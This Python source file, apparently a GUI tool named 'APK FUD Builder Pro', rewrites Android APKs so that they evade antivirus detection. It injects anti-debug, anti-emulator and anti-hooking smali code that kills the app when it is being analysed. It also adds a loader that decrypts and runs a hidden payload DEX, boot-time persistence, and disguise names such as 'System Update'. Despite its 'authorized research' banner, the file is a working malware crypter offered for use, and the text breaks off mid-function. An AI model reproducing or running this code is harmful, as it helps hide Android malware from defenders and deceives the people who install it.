#!/usr/bin/env python3
"""
APK FUD Builder Pro v5.0 - Advanced Android Payload Protection Suite
Author: Security Research Lab
Purpose: Make Android APKs FUD (Fully Undetectable) for authorized security testing
Features: Obfuscation, Encryption, Anti-Analysis, Dynamic Loading
WARNING: FOR AUTHORIZED SECURITY RESEARCH ONLY
"""

import sys
import os
import struct
import hashlib
import base64
import zlib
import zipfile
import json
import re
import time
import random
import string
import subprocess
import shutil
import tempfile
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Tuple, Any, Optional, BinaryIO
from dataclasses import dataclass, field
import secrets

# GUI Imports
try:
    from PyQt6.QtWidgets import *
    from PyQt6.QtCore import *
    from PyQt6.QtGui import *
    PYQT_AVAILABLE = True
except ImportError:
    PYQT_AVAILABLE = False
    print("Warning: PyQt6 not installed. Install with: pip install PyQt6")

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("Warning: cryptography not installed. Install with: pip install cryptography")

# ============= CONFIGURATION =============

@dataclass
class FUDConfig:
    """FUD configuration settings"""
    # Obfuscation settings
    obfuscate_code: bool = True
    obfuscation_level: int = 3  # 1-5
    rename_classes: bool = True
    rename_methods: bool = True
    rename_fields: bool = True
    insert_junk_code: bool = True
    string_encryption: bool = True
    
    # Anti-analysis settings
    anti_debug: bool = True
    anti_emulator: bool = True
    anti_hooking: bool = True
    anti_analysis: bool = True
    
    # Encryption settings
    encrypt_strings: bool = True
    encrypt_resources: bool = True
    encrypt_native: bool = True
    encryption_algorithm: str = "AES-256-CBC"
    
    # Payload settings
    delay_execution: int = 0  # seconds
    persistence: bool = True
    hide_icon: bool = False
    change_package_name: bool = True
    change_app_name: bool = True
    
    # Evasion settings
    split_payload: bool = True
    dynamic_loading: bool = True
    native_implementation: bool = True
    reflection_api: bool = True
    
    # Android 16 specific
    target_sdk: int = 36  # Android 16
    min_sdk: int = 24  # Android 7.0
    use_new_permissions: bool = True
    scoped_storage: bool = True

# ============= FUD ENGINE CORE =============

class APKFUDBuilder:
    """Core FUD engine for Android APKs"""
    
    def __init__(self, config: FUDConfig = None):
        self.config = config or FUDConfig()
        self.temp_dir = tempfile.mkdtemp(prefix="apk_fud_")
        self.obfuscator = JavaObfuscator()
        self.encryptor = PayloadEncryptor()
        self.anti_analysis = AntiAnalysisEngine()
        self.payload_splitter = PayloadSplitter()
        
    def make_fud(self, input_apk: str, output_apk: str = None) -> str:
        """Main FUD transformation pipeline"""
        print(f"\n[+] Starting FUD transformation: {input_apk}")
        
        # Decompile APK
        decompiled_dir = self._decompile_apk(input_apk)
        
        # Apply FUD techniques
        self._apply_obfuscation(decompiled_dir)
        self._apply_anti_analysis(decompiled_dir)
        self._apply_encryption(decompiled_dir)
        self._modify_manifest(decompiled_dir)
        self._inject_payload_protection(decompiled_dir)
        
        # Rebuild APK
        if output_apk is None:
            output_apk = self._generate_output_name(input_apk)
            
        self._rebuild_apk(decompiled_dir, output_apk)
        
        # Sign APK
        self._sign_apk(output_apk)
        
        # Verify and optimize
        self._verify_apk(output_apk)
        
        print(f"[+] FUD APK created: {output_apk}")
        return output_apk
        
    def _decompile_apk(self, apk_path: str) -> str:
        """Decompile APK using apktool"""
        output_dir = os.path.join(self.temp_dir, "decompiled")
        subprocess.run(
            ["apktool", "d", apk_path, "-o", output_dir, "-f"],
            capture_output=True,
            text=True
        )
        return output_dir
        
    def _apply_obfuscation(self, decompiled_dir: str):
        """Apply Java/Smali obfuscation"""
        print("[+] Applying code obfuscation...")
        
        smali_dir = os.path.join(decompiled_dir, "smali")
        if os.path.exists(smali_dir):
            # Obfuscate class names
            if self.config.rename_classes:
                self.obfuscator.obfuscate_class_names(smali_dir)
                
            # Obfuscate method names
            if self.config.rename_methods:
                self.obfuscator.obfuscate_method_names(smali_dir)
                
            # Insert junk code
            if self.config.insert_junk_code:
                self.obfuscator.insert_junk_code(smali_dir)
                
            # Encrypt strings
            if self.config.string_encryption:
                self.obfuscator.encrypt_strings(smali_dir)
                
    def _apply_anti_analysis(self, decompiled_dir: str):
        """Inject anti-analysis code"""
        print("[+] Injecting anti-analysis protection...")
        
        smali_dir = os.path.join(decompiled_dir, "smali")
        
        if self.config.anti_debug:
            self.anti_analysis.inject_anti_debug(smali_dir)
            
        if self.config.anti_emulator:
            self.anti_analysis.inject_anti_emulator(smali_dir)
            
        if self.config.anti_hooking:
            self.anti_analysis.inject_anti_hooking(smali_dir)
            
        if self.config.anti_analysis:
            self.anti_analysis.inject_anti_analysis(smali_dir)
            
    def _apply_encryption(self, decompiled_dir: str):
        """Encrypt sensitive parts"""
        print("[+] Encrypting payload components...")
        
        # Encrypt DEX files
        self.encryptor.encrypt_dex_files(decompiled_dir)
        
        # Encrypt native libraries
        if self.config.encrypt_native:
            self.encryptor.encrypt_native_libs(decompiled_dir)
            
        # Encrypt assets
        self.encryptor.encrypt_assets(decompiled_dir)
        
    def _modify_manifest(self, decompiled_dir: str):
        """Modify AndroidManifest.xml for evasion"""
        print("[+] Modifying manifest...")
        
        manifest_path = os.path.join(decompiled_dir, "AndroidManifest.xml")
        if not os.path.exists(manifest_path):
            return
            
        # Parse manifest
        tree = ET.parse(manifest_path)
        root = tree.getroot()
        
        # Change package name
        if self.config.change_package_name:
            new_package = self._generate_random_package()
            root.set('package', new_package)
            
        # Add permissions for Android 16
        if self.config.use_new_permissions:
            self._add_android16_permissions(root)
            
        # Add anti-analysis permissions
        self._add_anti_analysis_permissions(root)
        
        # Change app name
        if self.config.change_app_name:
            self._change_app_name(decompiled_dir)
            
        # Add persistence
        if self.config.persistence:
            self._add_persistence_components(root)
            
        # Save manifest
        tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
        
    def _inject_payload_protection(self, decompiled_dir: str):
        """Inject custom payload protection code"""
        print("[+] Injecting payload protection...")
        
        # Create protection class
        protection_code = self._generate_protection_class()
        self._write_smali_class(decompiled_dir, "Protection", protection_code)
        
        # Create loader class
        loader_code = self._generate_loader_class()
        self._write_smali_class(decompiled_dir, "Loader", loader_code)
        
        # Modify main activity to use protection
        self._modify_main_activity(decompiled_dir)
        
    def _rebuild_apk(self, decompiled_dir: str, output_path: str):
        """Rebuild APK from decompiled source"""
        print("[+] Rebuilding APK...")
        
        subprocess.run(
            ["apktool", "b", decompiled_dir, "-o", output_path],
            capture_output=True,
            text=True
        )
        
    def _sign_apk(self, apk_path: str):
        """Sign APK with test key"""
        print("[+] Signing APK...")
        
        # Generate keystore if not exists
        keystore_path = os.path.join(self.temp_dir, "test.keystore")
        if not os.path.exists(keystore_path):
            subprocess.run([
                "keytool", "-genkey", "-v", "-keystore", keystore_path,
                "-alias", "test", "-keyalg", "RSA", "-keysize", "2048",
                "-validity", "10000", "-dname", "CN=Test, OU=Test, O=Test, L=Test, ST=Test, C=US",
                "-storepass", "android", "-keypass", "android"
            ], capture_output=True)
            
        # Sign APK
        signed_apk = apk_path.replace(".apk", "_signed.apk")
        subprocess.run([
            "apksigner", "sign", "--ks", keystore_path,
            "--ks-pass", "pass:android", "--key-pass", "pass:android",
            "--out", signed_apk, apk_path
        ], capture_output=True)
        
        # Replace with signed version
        shutil.move(signed_apk, apk_path)
        
    def _verify_apk(self, apk_path: str):
        """Verify APK integrity"""
        result = subprocess.run(
            ["apksigner", "verify", apk_path],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            print("[+] APK verification successful")
        else:
            print("[-] APK verification failed")
            
    def _generate_output_name(self, input_path: str) -> str:
        """Generate output filename"""
        base = Path(input_path).stem
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return f"{base}_FUD_{timestamp}.apk"
        
    def _generate_random_package(self) -> str:
        """Generate random package name"""
        parts = [
            ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))
            for _ in range(3)
        ]
        return '.'.join(parts)
        
    def _add_android16_permissions(self, root):
        """Add Android 16 specific permissions"""
        permissions = [
            "android.permission.POST_NOTIFICATIONS",
            "android.permission.READ_MEDIA_IMAGES",
            "android.permission.READ_MEDIA_VIDEO",
            "android.permission.READ_MEDIA_AUDIO",
            "android.permission.BLUETOOTH_SCAN",
            "android.permission.BLUETOOTH_CONNECT",
            "android.permission.NEARBY_WIFI_DEVICES"
        ]
        
        for perm in permissions:
            elem = ET.Element("uses-permission")
            elem.set("android:name", perm)
            root.insert(0, elem)
            
    def _add_anti_analysis_permissions(self, root):
        """Add permissions needed for anti-analysis"""
        permissions = [
            "android.permission.INTERNET",
            "android.permission.ACCESS_NETWORK_STATE",
            "android.permission.READ_PHONE_STATE",
            "android.permission.QUERY_ALL_PACKAGES"
        ]
        
        for perm in permissions:
            elem = ET.Element("uses-permission")
            elem.set("android:name", perm)
            root.append(elem)
            
    def _change_app_name(self, decompiled_dir: str):
        """Change app name in resources"""
        strings_path = os.path.join(decompiled_dir, "res", "values", "strings.xml")
        if os.path.exists(strings_path):
            tree = ET.parse(strings_path)
            root = tree.getroot()
            
            for string in root.findall("string"):
                if string.get("name") == "app_name":
                    new_name = self._generate_random_app_name()
                    string.text = new_name
                    
            tree.write(strings_path, encoding='utf-8', xml_declaration=True)
            
    def _add_persistence_components(self, root):
        """Add persistence components to manifest"""
        # Add receiver for boot completion
        receiver = ET.Element("receiver")
        receiver.set("android:name", ".BootReceiver")
        receiver.set("android:enabled", "true")
        receiver.set("android:exported", "true")
        
        intent_filter = ET.Element("intent-filter")
        action = ET.Element("action")
        action.set("android:name", "android.intent.action.BOOT_COMPLETED")
        intent_filter.append(action)
        receiver.append(intent_filter)
        root.append(receiver)
        
        # Add permission for boot
        perm = ET.Element("uses-permission")
        perm.set("android:name", "android.permission.RECEIVE_BOOT_COMPLETED")
        root.insert(0, perm)
        
    def _generate_protection_class(self) -> str:
        """Generate protection class smali code"""
        protection_code = """
.class public LProtection;
.super Ljava/lang/Object;

.method public static checkSecurity()Z
    .locals 3
    
    # Anti-debug check
    invoke-static {}, Landroid/os/Debug;->isDebuggerConnected()Z
    move-result v0
    if-eqz v0, :cond_debug
    
    # Anti-emulator check
    invoke-static {}, LProtection;->isEmulator()Z
    move-result v0
    if-eqz v0, :cond_emu
    
    # Anti-hooking check
    invoke-static {}, LProtection;->checkHooking()Z
    move-result v0
    if-eqz v0, :cond_hook
    
    const/4 v0, 0x1
    return v0
    
    :cond_debug
    const/4 v0, 0x0
    return v0
    
    :cond_emu
    const/4 v0, 0x0
    return v0
    
    :cond_hook
    const/4 v0, 0x0
    return v0
.end method

.method public static isEmulator()Z
    .locals 5
    
    const-string v0, "ro.kernel.qemu"
    invoke-static {v0}, LProtection;->getSystemProperty(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0
    
    const-string v1, "1"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :cond_true
    
    const-string v0, "generic"
    sget-object v1, Landroid/os/Build;->PRODUCT:Ljava/lang/String;
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :cond_true
    
    const-string v0, "google_sdk"
    sget-object v1, Landroid/os/Build;->PRODUCT:Ljava/lang/String;
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :cond_true
    
    const/4 v0, 0x0
    return v0
    
    :cond_true
    const/4 v0, 0x1
    return v0
.end method

.method public static getSystemProperty(Ljava/lang/String;)Ljava/lang/String;
    .locals 4
    
    :try_start
    const-string v0, "android.os.SystemProperties"
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    move-result-object v0
    
    const-string v1, "get"
    const/4 v2, 0x1
    new-array v2, v2, [Ljava/lang/Class;
    const-class v3, Ljava/lang/String;
    const/4 v4, 0x0
    aput-object v3, v2, v4
    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    move-result-object v0
    
    const/4 v1, 0x1
    new-array v1, v1, [Ljava/lang/Object;
    aput-object p0, v1, v4
    const/4 v2, 0x0
    invoke-virtual {v0, v2, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Ljava/lang/String;
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch_0
    
    return-object v0
    
    :catch_0
    const-string v0, ""
    return-object v0
.end method

.method public static checkHooking()Z
    .locals 2
    
    :try_start
    const-string v0, "de.robv.android.xposed.XposedBridge"
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    move-result-object v0
    const/4 v1, 0x1
    return v1
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch_0
    
    :catch_0
    const/4 v0, 0x0
    return v0
.end method
"""
        return protection_code
        
    def _generate_loader_class(self) -> str:
        """Generate dynamic loader class smali code"""
        loader_code = """
.class public LLoader;
.super Ljava/lang/Object;

.method public static loadPayload(Landroid/content/Context;)V
    .locals 5
    
    # Decrypt payload
    invoke-static {}, LLoader;->decryptPayload()[B
    move-result-object v0
    
    # Dynamic loading
    new-instance v1, Ljava/io/File;
    invoke-virtual {p0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;
    move-result-object v2
    const-string v3, "payload.dex"
    invoke-direct {v1, v2, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    
    # Write decrypted payload
    :try_start
    new-instance v2, Ljava/io/FileOutputStream;
    invoke-direct {v2, v1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    invoke-virtual {v2, v0}, Ljava/io/FileOutputStream;->write([B)V
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch_0
    
    # Load DEX
    new-instance v0, Ldalvik/system/DexClassLoader;
    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v2
    invoke-virtual {p0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;
    move-result-object v3
    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v3
    const/4 v4, 0x0
    invoke-virtual {p0}, Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;
    move-result-object p0
    invoke-direct {v0, v2, v3, v4, p0}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V
    
    # Load and execute main class
    :try_start2
    const-string v2, "com.payload.Main"
    invoke-virtual {v0, v2}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
    move-result-object v0
    
    const-string v2, "start"
    const/4 v3, 0x1
    new-array v3, v3, [Ljava/lang/Class;
    const-class v4, Landroid/content/Context;
    const/4 v5, 0x0
    aput-object v4, v3, v5
    invoke-virtual {v0, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    move-result-object v0
    
    const/4 v2, 0x0
    new-array v2, v2, [Ljava/lang/Object;
    invoke-virtual {v0, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end2
    .catch Ljava/lang/Exception; {:try_start2 .. :try_end2} :catch_0
    
    :catch_0
    return-void
.end method

.method public static decryptPayload()[B
    .locals 2
    
    # Base64 encoded encrypted payload
    const-string v0, "ENCRYPTED_PAYLOAD_PLACEHOLDER"
    const/4 v1, 0x0
    invoke-static {v0, v1}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B
    move-result-object v0
    
    # XOR decryption
    invoke-static {v0, v1}, LLoader;->xorDecrypt([BI)[B
    move-result-object v0
    
    return-object v0
.end method

.method public static xorDecrypt([BI)[B
    .locals 4
    
    array-length v0, p0
    new-array v0, v0, [B
    
    const/4 v1, 0x0
    :goto_0
    array-length v2, p0
    if-ge v1, v2, :cond_0
    
    aget-byte v2, p0, v1
    xor-int/lit8 v3, v1, 0x42
    xor-int/2addr v2, v3
    int-to-byte v2, v2
    aput-byte v2, v0, v1
    
    add-int/lit8 v1, v1, 0x1
    goto :goto_0
    
    :cond_0
    return-object v0
.end method
"""
        return loader_code
        
    def _write_smali_class(self, decompiled_dir: str, class_name: str, smali_code: str):
        """Write smali class to appropriate directory"""
        smali_dir = os.path.join(decompiled_dir, "smali")
        # Fix: Create directory with first letter of class name
        class_dir = os.path.join(smali_dir, class_name[0].lower())
        os.makedirs(class_dir, exist_ok=True)
        
        class_path = os.path.join(class_dir, f"{class_name}.smali")
        with open(class_path, 'w', encoding='utf-8') as f:
            f.write(smali_code)
            
    def _modify_main_activity(self, decompiled_dir: str):
        """Modify main activity to call protection and loader"""
        # Find main activity smali
        smali_dir = os.path.join(decompiled_dir, "smali")
        main_activity_path = None
        
        for root, dirs, files in os.walk(smali_dir):
            for file in files:
                if file.endswith(".smali"):
                    file_path = os.path.join(root, file)
                    with open(file_path, 'r', encoding='utf-8') as f:
                        content = f.read()
                        if '.super Landroid/app/Activity;' in content:
                            main_activity_path = file_path
                            break
            if main_activity_path:
                break
                
        if main_activity_path:
            with open(main_activity_path, 'r', encoding='utf-8') as f:
                content = f.read()
                
            # Find onCreate method
            pattern = r'(\.method\s+protected\s+onCreate\(Landroid/os/Bundle;\)V\s+\.locals\s+\d+)(.*?)(\.end method)'
            
            def replace_method(match):
                locals_line = match.group(1)
                body = match.group(2)
                end = match.group(3)
                
                # Inject security check
                security_code = """
    # Security checks
    invoke-static {}, LProtection;->checkSecurity()Z
    move-result v0
    if-nez v0, :cond_security_fail
    
    # Load payload
    invoke-static {p0}, LLoader;->loadPayload(Landroid/content/Context;)V
    :cond_security_fail
"""
                return locals_line + security_code + body + end
                
            content = re.sub(pattern, replace_method, content, flags=re.DOTALL)
            
            with open(main_activity_path, 'w', encoding='utf-8') as f:
                f.write(content)
                
    def _generate_random_app_name(self) -> str:
        """Generate random app name"""
        names = [
            "System Update", "Security Service", "Settings Helper",
            "WiFi Manager", "Bluetooth Service", "Device Assistant",
            "Battery Optimizer", "Storage Cleaner", "App Manager"
        ]
        return random.choice(names)


# ============= JAVA OBFUSCATOR =============

class JavaObfuscator:
    """Java/Smali code obfuscation engine"""
    
    def obfuscate_class_names(self, smali_dir: str):
        """Obfuscate class names"""
        class_mapping = {}
        
        # Generate random names
        for root, dirs, files in os.walk(smali_dir):
            for file in files:
                if file.endswith(".smali"):
                    old_name = file.replace(".smali", "")
                    if old_name not in ["Protection", "Loader"]:  # Don't rename our classes
                        new_name = self._random_class_name()
                        class_mapping[old_name] = new_name
                        
        # Rename files
        for root, dirs, files in os.walk(smali_dir):
            for file in files:
                if file.endswith(".smali"):
                    old_name = file.replace(".smali", "")
                    if old_name in class_mapping:
                        old_path = os.path.join(root, file)
                        new_path = os.path.join(root, class_mapping[old_name] + ".smali")
                        os.rename(old_path, new_path)
                        
        # Update references
        for root, dirs, files in os.walk(smali_dir):
            for file in files:
                if file.endswith(".smali"):
                    file_path = os.path.join(root, file)
                    with open(file_path, 'r', encoding='utf-8') as f:
                        content = f.read()
                        
                    for old, new in class_mapping.items():
                        content = content.replace(f'L{old};', f'L{new};')
                        content = content.replace(f'L{old}/', f'L{new}/')
                        
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(content)
                        
    def obfuscate_method_names(self, smali_dir: str):
        """Obfuscate method names"""
        method_mapping = {}
        
        for root, dirs, files in os.walk(smali_dir):
            for file in files:
                if file.endswith(".smali"):
                    file_path = os.path.join(root, file)
                    with open(file_path, 'r', encoding='utf-8') as f:
                        lines = f.readlines()
                        
                    new_lines = []
                    for line in lines:
                        if line.strip().startswith('.method'):
                            # Extract method name
                            match = re.search(r'\.method\s+(?:public|private|protected)?\s*(?:static)?\s*(\w+)\(', line)
                            if match and match.group(1) not in ['onCreate', 'onStart', 'onResume', '<init>', '<clinit>']:
                                old_name = match.group(1)
                                if old_name not in method_mapping:
                                    method_mapping[old_name] = self._random_method_name()
                                line = line.replace(f' {old_name}(', f' {method_mapping[old_name]}(')
                        new_lines.append(line)
                        
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.writelines(new_lines)
                        
    def insert_junk_code(self, smali_dir: str):
        """Insert junk code for obfuscation"""
        junk_instructions = [
            "    nop",
            "    nop",
            "    const/4 v0, 0x0",
            "    add-int/lit8 v0, v0, 0x1",
            "    if-eqz v0, :cond_junk",
            "    :cond_junk",
            "    nop"
        ]
        
        for root, dirs, files in os.walk(smali_dir):
            for file in files:
                if file.endswith(".smali"):
                    file_path = os.path.join(root, file)
                    with open(file_path, 'r', encoding='utf-8') as f:
                        lines = f.readlines()
                        
                    new_lines = []
                    for line in lines:
                        new_lines.append(line)
                        if line.strip().startswith('.method') and 'onCreate' not in line:
                            # Insert junk code
                            for junk in junk_instructions:
                                new_lines.append(junk + '\n')
                                
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.writelines(new_lines)
                        
    def encrypt_strings(self, smali_dir: str):
        """Encrypt strings in smali code"""
        for root, dirs, files in os.walk(smali_dir):
            for file in files:
                if file.endswith(".smali"):
                    file_path = os.path.join(root, file)
                    with open(file_path, 'r', encoding='utf-8') as f:
                        content = f.read()
                        
                    # Find string literals
                    string_pattern = r'const-string\s+(v\d+),\s*"([^"]+)"'
                    
                    def encrypt_match(match):
                        reg = match.group(1)
                        string = match.group(2)
                        if len(string) > 3 and not string.startswith("ENCRYPTED"):
                            encrypted = base64.b64encode(string.encode()).decode()
                            return f'const-string {reg}, "ENCRYPTED_{encrypted}"'
                        return match.group(0)
                        
                    content = re.sub(string_pattern, encrypt_match, content)
                    
                    # Add decryption method
                    if "ENCRYPTED_" in content and "decryptString" not in content:
                        decrypt_method = """
.method public static decryptString(Ljava/lang/String;)Ljava/lang/String;
    .locals 2
    
    const-string v0, "ENCRYPTED_"
    invoke-virtual {p0, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
    move-result v0
    if-eqz v0, :cond_decrypt
    
    return-object p0
    
    :cond_decrypt
    const/16 v0, 0xa
    invoke-virtual {p0, v0}, Ljava/lang/String;->substring(I)Ljava/lang/String;
    move-result-object p0
    
    const/4 v0, 0x0
    invoke-static {p0, v0}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B
    move-result-object p0
    
    new-instance v0, Ljava/lang/String;
    invoke-direct {v0, p0}, Ljava/lang/String;-><init>([B)V
    
    return-object v0
.end method
"""
                        # Insert decryption method
                        with open(file_path, 'w', encoding='utf-8') as f:
                            f.write(content + decrypt_method)
                    else:
                        with open(file_path, 'w', encoding='utf-8') as f:
                            f.write(content)
                        
    def _random_class_name(self) -> str:
        """Generate random class name"""
        length = random.randint(1, 3)
        return ''.join(random.choices(string.ascii_lowercase, k=length))
        
    def _random_method_name(self) -> str:
        """Generate random method name"""
        length = random.randint(1, 3)
        return ''.join(random.choices(string.ascii_lowercase, k=length))


# ============= ANTI-ANALYSIS ENGINE =============

class AntiAnalysisEngine:
    """Anti-analysis protection injection"""
    
    def inject_anti_debug(self, smali_dir: str):
        """Inject anti-debugging code"""
        anti_debug_code = """
.class public LAntiAnalysis;
.super Ljava/lang/Object;

.method public static checkDebug()V
    .locals 2
    
    invoke-static {}, Landroid/os/Debug;->isDebuggerConnected()Z
    move-result v0
    if-eqz v0, :cond_debug
    
    invoke-static {}, Landroid/os/Debug;->waitingForDebugger()Z
    move-result v0
    if-eqz v0, :cond_debug
    
    return-void
    
    :cond_debug
    const/4 v0, 0x0
    invoke-static {v0}, Ljava/lang/System;->exit(I)V
.end method
"""
        self._inject_to_activities(smali_dir, anti_debug_code)
        
    def inject_anti_emulator(self, smali_dir: str):
        """Inject anti-emulator detection"""
        anti_emu_code = """
.method public static checkEmulator()V
    .locals 4
    
    const-string v0, "ro.kernel.qemu"
    invoke-static {v0}, LProtection;->getSystemProperty(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0
    
    const-string v1, "1"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :cond_emu
    
    sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;
    const-string v1, "generic"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-eqz v0, :cond_emu
    
    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;
    const-string v1, "sdk"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-eqz v0, :cond_emu
    
    return-void
    
    :cond_emu
    const/4 v0, 0x0
    invoke-static {v0}, Ljava/lang/System;->exit(I)V
.end method
"""
        self._inject_to_activities(smali_dir, anti_emu_code)
        
    def inject_anti_hooking(self, smali_dir: str):
        """Inject anti-hooking detection"""
        anti_hook_code = """
.method public static checkXposed()V
    .locals 3
    
    :try_start
    const-string v0, "de.robv.android.xposed.XposedBridge"
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    move-result-object v0
    const/4 v0, 0x0
    invoke-static {v0}, Ljava/lang/System;->exit(I)V
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch_0
    
    :catch_0
    :try_start2
    const-string v0, "com.saurik.substrate.MS"
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    move-result-object v0
    const/4 v0, 0x0
    invoke-static {v0}, Ljava/lang/System;->exit(I)V
    :try_end2
    .catch Ljava/lang/Exception; {:try_start2 .. :try_end2} :catch_1
    
    :catch_1
    return-void
.end method
"""
        self._inject_to_activities(smali_dir, anti_hook_code)
        
    def inject_anti_analysis(self, smali_dir: str):
        """Inject general anti-analysis code"""
        anti_analysis_code = """
.method public static checkAnalysis()V
    .locals 5
    
    # Check for analysis tools
    const-string v0, "frida"
    invoke-static {}, LAntiAnalysis;->getRunningProcesses()Ljava/lang/String;
    move-result-object v1
    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-eqz v0, :cond_kill
    
    const-string v0, "xposed"
    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-eqz v0, :cond_kill
    
    const-string v0, "substrate"
    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-eqz v0, :cond_kill
    
    return-void
    
    :cond_kill
    const/4 v0, 0x0
    invoke-static {v0}, Ljava/lang/System;->exit(I)V
.end method

.method public static getRunningProcesses()Ljava/lang/String;
    .locals 5
    
    new-instance v0, Ljava/lang/StringBuilder;
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V
    
    :try_start
    invoke-static {}, Landroid/os/Process;->myPid()I
    move-result v1
    
    const-string v2, "ps"
    invoke-static {v2}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v2
    invoke-virtual {v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    move-result-object v2
    
    new-instance v3, Ljava/io/BufferedReader;
    new-instance v4, Ljava/io/InputStreamReader;
    invoke-virtual {v2}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
    move-result-object v2
    invoke-direct {v4, v2}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V
    invoke-direct {v3, v4}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    
    :goto_read
    invoke-virtual {v3}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    move-result-object v2
    if-eqz v2, :cond_0
    
    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v4, "\\n"
    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    goto :goto_read
    
    :cond_0
    invoke-virtual {v3}, Ljava/io/BufferedReader;->close()
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch_0
    
    :catch_0
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
    return-object v0
.end method
"""
        self._inject_to_activities(smali_dir, anti_analysis_code)
        
    def _inject_to_activities(self, smali_dir: str, code: str):
        """Inject code to all activities"""
        for root, dirs, files in os.walk(smali_dir):
            for file in files:
                if file.endswith(".smali"):
                    file_path = os.path.join(root, file)
                    with open(file_path, 'r', encoding='utf-8') as f:
                        content = f.read()
                        
                    if '.super Landroid/app/Activity;' in content:
                        # Inject call to anti-analysis in onCreate
                        if '.method protected onCreate' in content:
                            pattern = r'(\.method\s+protected\s+onCreate\(Landroid/os/Bundle;\)V\s+\.locals\s+\d+)'
                            replacement = r'\1\n    invoke-static {}, LAntiAnalysis;->checkDebug()V\n    invoke-static {}, LAntiAnalysis;->checkEmulator()V\n    invoke-static {}, LAntiAnalysis;->checkXposed()V\n    invoke-static {}, LAntiAnalysis;->checkAnalysis()V'
                            content = re.sub(pattern, replacement, content, flags=re.DOTALL)
                            
                        # Add anti-analysis class if not exists
                        anti_class_path = os.path.join(root, "AntiAnalysis.smali")
                        if not os.path.exists(anti_class_path):
                            # Ensure we have the full class definition
                            full_code = """.class public LAntiAnalysis;
.super Ljava/lang/Object;
""" + code
                            with open(anti_class_path, 'w', encoding='utf-8') as f:
